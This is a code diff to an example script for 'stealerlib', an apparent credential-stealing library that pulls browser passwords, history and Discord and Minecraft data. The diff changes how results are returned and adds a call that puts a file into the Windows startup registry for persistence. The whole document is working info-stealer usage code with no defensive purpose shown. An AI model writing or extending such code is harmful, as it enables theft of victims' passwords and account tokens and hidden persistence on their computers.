@@ -13,7 +13,7 @@ from stealerlib.apps.discord import Discord
 from stealerlib.apps.minecraft import Minecraft
 
             # default on commands is True (browser.get_passwords())
-conv = True
+conv = False
             # if True, functions will return a list of values
             # as opposed to when False, where the functions will return
             # an interactive StealerLib object
@@ -21,12 +21,12 @@ conv = True
             # Example on how to iterate through an object vs. list of values
 
             # for site in history:
-            #     url = site[0]  # if conv=False
-            #     url = site.url # if conv=True
+            #     url = site[0]  # if conv=True
+            #     url = site.url # if conv=False
 
             # for login in passwords:
-            #     password = login[3]       # if conv=False
-            #     password = login.password # if conv=True
+            #     password = login[3]       # if conv=True
+            #     password = login.password # if conv=False
 
             # etc...
             # please use the StealerLib GitHub wiki for more information on how to use StealerLib objects -
@@ -90,6 +90,10 @@ if __name__ == '__main__':
     registry.get_installed_programs(conv=conv)
     print('Installed Programs:', registry.programs, '\n') # conv=True ->  [(email, username, uuid, token), ...]
                                                           # conv=False -> [RegistryTypes.Program, ...]
+
+    print("Adding print_test.py to the startup folder via registry...\n")
+    file_added = registry.add_file_to_startup("C:\\Users\\maxsi\\OneDrive\\Desktop\\Programming\\GitHub\\stealerlib\\print_test.py")
+    print('File added to startup:', file_added, '\n')
 
     #print(system.comp_info,
           #system.os_info,
